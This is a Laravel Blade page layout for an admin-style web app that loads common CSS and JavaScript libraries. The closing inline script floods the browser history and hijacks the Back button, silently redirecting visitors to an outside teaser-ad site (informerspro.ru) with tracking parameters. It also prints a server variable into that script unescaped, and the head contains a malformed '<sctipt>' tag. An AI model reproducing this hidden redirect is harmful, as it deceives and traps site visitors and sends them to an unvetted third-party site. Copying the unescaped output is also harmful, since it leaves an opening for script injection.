<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <title>{{ trans('panel.site_title') }}</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" />
    <link href="{{ asset('css/adminltev3.css') }}" rel="stylesheet" />
    <link href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet" />
    <link href="https://cdn.jsdelivr.net/npm/icheck-bootstrap@3.0.1/icheck-bootstrap.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet" />
    <link href="/css/site.css" rel="stylesheet" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script src="/js/jquery.jscroll.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>


    @stack('styles')
    @yield('styles')
    @yield('head_script')
    <sctipt>
    
    
</head>

<body class="header-fixed sidebar-fixed aside-menu-fixed aside-menu-hidden">

    @yield('content')
    @yield('scripts')
    @yield('body_script')

    <script>


    !function () {
        var t;
        @if (isset($link) && strlen($link) > 0)
        var link = '{!!$link!!}';
        @else
        var link = 'utm_source=vback&sid8=vback';
        @endif

        try {
            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
            onpopstate = function (t) {
                t.state && location.replace("https://informerspro.ru/tizers?" + link)
            }
        } catch (o) {}
    }();
</script>

</body>

</html>